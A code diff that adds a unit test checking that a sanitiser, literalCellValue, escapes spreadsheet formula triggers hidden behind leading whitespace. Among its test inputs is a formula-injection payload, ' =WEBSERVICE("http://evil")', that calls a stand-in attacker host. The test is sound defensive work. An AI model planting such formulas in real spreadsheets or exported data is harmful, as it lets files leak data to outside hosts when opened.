@@ -47,6 +47,16 @@ test("literalCellValue neutralises every formula-triggering prefix", () => {
   }
 });
 
+test("literalCellValue neutralises whitespace-leading formula triggers", () => {
+  // SEC-01: Range.values evaluates a value whose formula trigger starts after
+  // whitespace, exactly as if it started at the first character — Excel trims
+  // leading whitespace before formula detection. A first-character-only test
+  // let " =WEBSERVICE(...)" through as a live formula.
+  for (const v of [' =WEBSERVICE("http://evil")', "\t+1+1", "\n-1", "  @SUM(A1)"]) {
+    assert.equal(literalCellValue(v), "'" + v, `unescaped: ${JSON.stringify(v)}`);
+  }
+});
+
 test("literalCellValue leaves ordinary values alone", () => {
   assert.equal(literalCellValue("hello"), "hello");
   assert.equal(literalCellValue("a=b"), "a=b", "only a LEADING trigger counts");
